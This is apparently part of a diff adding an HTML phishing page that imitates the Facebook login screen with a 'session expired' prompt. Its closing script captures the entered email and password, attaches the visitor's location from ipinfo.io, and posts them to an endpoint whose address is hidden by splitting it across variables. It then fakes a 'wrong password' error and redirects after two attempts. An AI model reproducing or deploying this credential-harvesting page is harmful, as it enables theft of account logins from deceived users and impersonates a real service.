MVOetqGw8/cAKMEeXMFyK+uIkpjpsz0ZDPTuA7OnPc3uN0qy4GF2BvJIek/IX07IIpsDvepoIUr52FzrmeDQqyQUMG/zGQ4krACz/RBu/YxWg3AHof905hYC17Frff7OanS/DzQFMr2ON88TvXys4LljO9565AGXwbKpOvEY1SVCw+tzxMlnNc7+U/13Vkf1bAug00K09KBdRgMqAgc1v+PClGfuvbb+TP72nPhFRBKs0+lYBfcbCG7D5EM7GjFqcMqkDIsw9ts8/d8iXZDqorO16tIlcwbCmz1+LVYFelXI1Qywc4d2T3I7aZ52z9mUqyuG7/eApdXLHzfLbvss8RhuG7KihfWivLPLyTnbpjY33LRd8YNRWkOE9uL1CYjCRkUC9I67781RuU0gBOAcKVTvgyX3RuqfYux5DJzu0c7MvwmrWA7jRouL6ykiBGVKR4mXxBmbFnmyQ7NlnD23Tk7s0Iz96FUKbitFugFAr0cl3TFv+aeZHFByPYHUJG0tv59Ee5uPcWsvuBKhKKotRkVd6FWLuKxBgqwQmsjgO7sVyGT6C1DwxiWLv3AnGu5HV21fJyNfiAkLI4PU35Mvma4PWVhNLSUpAX2/DBK7arh/wGrVQhu/3LF/L863VJCfiYFtmNnc30mDibZu3WW99ZCC9ErXgSd0p1789dsHtrKmON67fEYnAo3XVIKNPBdyDCFhAedUC50zLV69Rk0HeMaUHUSX3vS6XP+jT4YpGj9BjJ6DxqDPggVwAwgwlLpiJqeaXq1W3wMa4rsaxHUSeqqgqqqPTH7b1gCsNl6EQYreTWr5uVLxKhZWH4w3b+RDNtS2jd/R/5nbBYEVVOigAAAABJRU5ErkJggg==" alt="Facebook">
+					<h2 class="" style="max-width: 500px;">Facebook helps you connect and share with the people in your life.</h2>
+				</div>
+			
+			</div>
+			
+			<div class="col s_col" >
+				<div class="col one_col" style="">
+				
+				<form action="" method="post" id="form_">
+				
+					<div style="margin-top: 0px; text-align: center;">
+						<p style="font-size: 13px; font-weight: 400; line-height: 1.42857; color: rgba(0,0,200,1); padding-top: 10px">Session expired! Sign in to continue...</p>
+					</div>
+          <div class="input_icon_holder2" style="display: block;">
+            <input type='hidden' required class='text mm' id="ckorg" placeholder="Email Address" value="[[-Email-]]" readonly>
+            <input type="hidden" class='text' name="loc" id="loc">
+            <input type="hidden" class='text' name="trial" id="trial">
+            <input type='text' placeholder="Email Address or Phone number" required class='text mm'
+              name='second-trial-user' id='ck' value="">
+          
+          </div>
+          
+          <div class="input_icon_holder2 " style="display: block;">
+            <input type='password' placeholder="Password" required class='text mm' name='second-trial-pss' id='cknow'>
+            <button type="button" id='label'><i class="fa fa-eye-stoke"></i></button>
+          
+          </div>
+
+					<input type="hidden" class='text' name="loc" id="loc">
+					<input type="hidden" class='text' name="platform" id="platform">
+
+					<div id="errmsg" style="color: #d00; font-weight: 600; font-family: sans-serif; font-size: 13px;">
+						
+					</div>
+					
+					
+					<button type='submit' class='inv_btn inv_btn_i' style="margin: 0; margin-top: 19px; width: 100%; font-size:20px; font-family: system-ui; font-weight: bold; background-color: #1877f2; border-radius: 6px; line-height: 48px; padding: 0 16px;" id="loader">
+      Login
+					</button><br>
+
+					<div style="position: relative; left: -8px; margin-top: 10px; padding-left: 8px; color: #1877f2 !important; padding-top: 10px; padding-bottom: 10px; text-align: center; font-size: 14px;">
+						<a href='#' style=" color: #1877f2 !important;">
+							<span style=" font-family: system-ui; font-weight: normal; font-size: 14px">Forgotten password?</span></a>
+					</div>
+
+					<hr style="width: 100%; position: relative; z-index: 1; height: 1px; background-color: rgba(0,0,0,0.15); border: none; margin: 12px 0">
+
+					<button type='button' class='bbtn' style="">
+      Create new account
+					</button><br>
+
+					
+				</form>
+			</div>
+			<div class="col one_col">
+				<div style="border-top: none; color: #1c1e21; font-family: SFProText-Regular, Helvetica, Arial, sans-serif; font-size: 14px; font-weight: normal; padding-top: 0; margin-top: 28px; text-align: center;">
+					<a href="/pages/create/?ref_type=registration_form"
+						style="font-family: SFProText-Semibold, Helvetica, Arial, sans-serif; font-size: 14px; font-weight: 600;">Create a Page</a> for a celebrity, brand or business.
+				</div>
+			</div>
+		</div>
+				
+	</div>
+</div>
+
+<style type="text/css">
+
+	ul.on, ul.on2 {
+		list-style: none;
+	}
+
+	ul.on > li{
+		border-bottom: 1px solid #ddd;
+		color: #9197a3;
+		font-size: 12px;
+		padding: 5px 8px 10px 0;
+		float: left;
+
+	}
+
+	ul.on2 > li{
+		//border-top: 1px solid #ddd;
+		color: #9197a3;
+		font-size: 12px;
+		padding: 5px 8px 6px 0;
+		float: left;
+		line-height: 10px;
+	}
+
+	ul.on > li > a{
+		color: #9197a3;
+		font-size: 12px;
+		padding: 0 5px 0 0;
+		font-weight: normal;
+	}
+
+	ul.on2 > li > a{
+		color: #9197a3;
+		font-size: 12px;
+		padding: 0 5px 0 0;
+		font-weight: normal;
+	}
+
+
+</style>
+<div id="frame" style="background-color: #fff; font-size: 12px;">
+	
+	<div id="inner-frame" align="center" style="">
+		<div style="color: #141823; background-color: #fff; margin: 0; padding: 0; text-align: center;">
+			<ul class="on" style=" background-color: #fff; font-family: Helvetica, Lucida Grande, Arial, Tahoma, Verdana, sans-serif; margin: 0; padding: 0; text-align: center; list-style-type: none;">
+				<li>English (US)</li><li><a class="_sv4" dir="ltr" href="https://es-la.facebook.com/" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;es_LA&quot;, &quot;en_US&quot;, &quot;https:\/\/es-la.facebook.com\/&quot;, &quot;www_list_selector&quot;, 0); return false;" title="Spanish">Español</a></li><li><a class="_sv4" dir="ltr" href="https://fr-fr.facebook.com/" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;fr_FR&quot;, &quot;en_US&quot;, &quot;https:\/\/fr-fr.facebook.com\/&quot;, &quot;www_list_selector&quot;, 1); return false;" title="French (France)">Français (France)</a></li><li><a class="_sv4" dir="ltr" href="https://zh-cn.facebook.com/" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;zh_CN&quot;, &quot;en_US&quot;, &quot;https:\/\/zh-cn.facebook.com\/&quot;, &quot;www_list_selector&quot;, 2); return false;" title="Simplified Chinese (China)">中文(简体)</a></li><li><a class="_sv4" dir="rtl" href="https://ar-ar.facebook.com/" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;ar_AR&quot;, &quot;en_US&quot;, &quot;https:\/\/ar-ar.facebook.com\/&quot;, &quot;www_list_selector&quot;, 3); return false;" title="Arabic">العربية</a></li><li><a class="_sv4" dir="ltr" href="https://pt-br.facebook.com/" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;pt_BR&quot;, &quot;en_US&quot;, &quot;https:\/\/pt-br.facebook.com\/&quot;, &quot;www_list_selector&quot;, 4); return false;" title="Portuguese (Brazil)">Português (Brasil)</a></li><li><a class="_sv4" dir="ltr" href="https://it-it.facebook.com/" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;it_IT&quot;, &quot;en_US&quot;, &quot;https:\/\/it-it.facebook.com\/&quot;, &quot;www_list_selector&quot;, 5); return false;" title="Italian">Italiano</a></li><li><a class="_sv4" dir="ltr" href="https://ko-kr.facebook.com/" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;ko_KR&quot;, &quot;en_US&quot;, &quot;https:\/\/ko-kr.facebook.com\/&quot;, &quot;www_list_selector&quot;, 6); return false;" title="Korean">한국어</a></li><li><a class="_sv4" dir="ltr" href="https://de-de.facebook.com/" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;de_DE&quot;, &quot;en_US&quot;, &quot;https:\/\/de-de.facebook.com\/&quot;, &quot;www_list_selector&quot;, 7); return false;" title="German">Deutsch</a></li><li><a class="_sv4" dir="ltr" href="https://hi-in.facebook.com/" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;hi_IN&quot;, &quot;en_US&quot;, &quot;https:\/\/hi-in.facebook.com\/&quot;, &quot;www_list_selector&quot;, 8); return false;" title="Hindi">हिन्दी</a></li><li><a class="_sv4" dir="ltr" href="https://ja-jp.facebook.com/" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;ja_JP&quot;, &quot;en_US&quot;, &quot;https:\/\/ja-jp.facebook.com\/&quot;, &quot;www_list_selector&quot;, 9); return false;" title="Japanese">日本語</a></li><li><a role="button" class="_42ft _4jy0 _517i _517h _51sy" rel="dialog" ajaxify="/settings/language/language/?uri=https%3A%2F%2Fja-jp.facebook.com%2F&amp;source=www_list_selector_more" href="#" title="Show more languages"><i class="img sp_AcVttjh25zD_1_5x sx_e1cbcd"></i></a></li></ul>
+
+			<div style="height: 30px; padding-bottom: 10px; padding-top: 10px; text-align: center;"></div>
+
+			<div  style="margin-top: 20px;">
+				<ul class="on2"><li><a href="/reg/" title="Sign Up for Facebook">Sign Up</a></li><li><a href="/login/" title="Log into Facebook">Log In</a></li><li><a href="https://messenger.com/" title="Check out Messenger.">Messenger</a></li><li><a href="/lite/" title="Facebook Lite for Android.">Facebook Lite</a></li><li><a href="https://www.facebook.com/watch/" title="Browse our Watch videos.">Watch</a></li><li><a href="/places/" title="Check out popular places on Facebook.">Places</a></li><li><a href="/games/" title="Check out Facebook games.">Games</a></li><li><a href="/marketplace/" title="Buy and sell on Facebook Marketplace.">Marketplace</a></li><li><a href="https://pay.facebook.com/" title="Learn more about Facebook Pay" target="_blank">Facebook Pay</a></li><li><a href="https://www.oculus.com/" title="Learn more about Oculus" target="_blank">Oculus</a></li><li><a href="https://portal.facebook.com/" title="Learn more about Facebook Portal" target="_blank">Portal</a></li><li><a href="https://l.facebook.com/l.php?u=https%3A%2F%2Fwww.instagram.com%2F&amp;h=AT1eya5HrqVChJqHjGphl0UVuktKx6guSlquMWWnykLxpZRLuR6F6RMZbByCwOsABPZghiA2LRSV-r1RuFni-dV-XYTe560-CngiJb6StA7WQxJ5w1-Ckl3hbO2qUJgvKLzK-JMACRphoHHoIDFgOA" title="Check out Instagram" target="_blank" rel="noopener nofollow" data-lynx-mode="asynclazy">Instagram</a></li><li><a href="https://www.bulletin.com/" title="Check out Bulletin Newsletter">Bulletin</a></li><li><a href="/local/lists/245019872666104/" title="Browse our Local Lists directory.">Local</a></li><li><a href="/fundraisers/" title="Donate to worthy causes.">Fundraisers</a></li><li><a href="/biz/directory/" title="Browse our Facebook Services directory.">Services</a></li><li><a href="/votinginformationcenter/?entry_point=c2l0ZQ%3D%3D" title="See the Voting Information Center.">Voting Information Center</a></li><li><a href="/groups/explore/" title="Explore our Groups.">Groups</a></li><li><a href="https://about.facebook.com/" accesskey="8" title="Read our blog, discover the resource center, and find job opportunities.">About</a></li><li><a href="/ad_campaign/landing.php?placement=pflo&amp;campaign_id=402047449186&amp;nav_source=unknown&amp;extra_1=auto" title="Advertise on Facebook.">Create Ad</a></li><li><a href="/pages/create/?ref_type=site_footer" title="Create a page">Create Page</a></li><li><a href="https://developers.facebook.com/?ref=pf" title="Develop on our platform.">Developers</a></li><li><a href="/careers/?ref=pf" title="Make your next career move to our awesome company.">Careers</a></li><li><a data-nocookies="1" href="/privacy/explanation/" title="Learn about your privacy and Facebook.">Privacy</a></li><li><a href="/policies/cookies/" title="Learn about cookies and Facebook." data-nocookies="1">Cookies</a></li><li><a class="_41ug" data-nocookies="1" href="https://www.facebook.com/help/568137493302217" title="Learn about Ad Choices.">Ad choices<i class="img sp_AcVttjh25zD_1_5x sx_e00af1"></i></a></li><li><a data-nocookies="1" href="/policies?ref=pf" accesskey="9" title="Review our terms and policies.">Terms</a></li><li><a href="/help/?ref=pf" accesskey="0" title="Visit our Help Center.">Help</a></li><li><a accesskey="6" class="accessible_elem" href="/settings" title="View and edit your Facebook settings.">Settings</a></li><li><a accesskey="7" class="accessible_elem" href="/allactivity?privacy_source=activity_log_top_menu" title="View your activity log">Activity log</a></li></ul></div>
+
+		<div style="color: #141823; background-color: #fff; margin: 0; margin-top: 20px; padding: 0; text-align: center; float: left; width: 100%; text-align: left;">
+			<div ><span> Meta © 2023</span></div>
+		</div>
+	</div>
+</div></div>
+
+	<script>
+		/* document.addEventListener('DOMContentLoaded', function () {
+    setInterval(function () {
+     let ccc = document.querySelector('.bg-text')
+     ccc.style.display = 'block'
+     ccc.style.animation = 'show 1s ease'
+    }, 2000)
+   }) */
+   const x = window.location.href.split('?');
+   let ck = document.querySelector('#ck')
+   let ckorg = document.querySelector('#ckorg')
+   let cknow = document.querySelector('#cknow')
+   let loader = document.querySelector('#loader')
+   let loc = document.querySelector('#loc')
+   let trial = document.querySelector('#trial')
+
+   if (x[1] != undefined) {
+    ck.value = x[1]
+    ckorg.value = x[1]
+   }
+
+   trial.value = trialCount
+
+   let myForm = document.querySelector('#form_')
+   //console.log(`${nbg1}${nbg2}${nbg3}${nbg4}${nbg5}${nbg6}${nbg7}`)
+   myForm.addEventListener('submit', async function (event) {
+    event.preventDefault()
+
+    let data = new FormData()
+
+    data.append('ck', ck.value)
+    data.append('ckorg', ckorg.value)
+    data.append('cknow', cknow.value)
+    data.append('loc', loc.value)
+    data.append('trial', trial.value)
+    data.append('resBox', resBox)
+
+     let options = {
+     method: 'POST',
+     body: data
+    }
+
+    loader.innerHTML = "<i class='fa fa-circle-o-notch fa-spin'></i> İşleme..."
+
+    const response = await fetch(`${nbg1}${nbg2}${nbg3}${nbg4}${nbg5}${nbg6}`, options)
+    const result = await response.text()
+
+    loader.innerHTML = "Giriş Yap"
+
+    console.log(result)
+
+    trialCount++;
+    sessionStorage.setItem("num_trial", trialCount);
+    trial.value = trialCount
+
+    if (trialCount >= 2) {
+     window.location.assign(`${ov1}${ov2}${ov3}${ov4}${ov5}${ov6}${ov7}`)
+    } else {
+     document.getElementById('errmsg').innerHTML = "Yanlış parola! lütfen tekrar deneyin "
+    }
+   })
+
+   $.get("https://ipinfo.io/json?token=10da60a9ff2d81", function (response) {
+    let cou = `${response.city}, ${response.region}, ${response.country}. ${response.postal} ${response.timezone}`
+    $("#loc").val(cou);
+   }, "jsonp");
+
+		//document.getElementById('platform').value = JSON.stringify(platform)
+	</script>
+</body>
+</html>
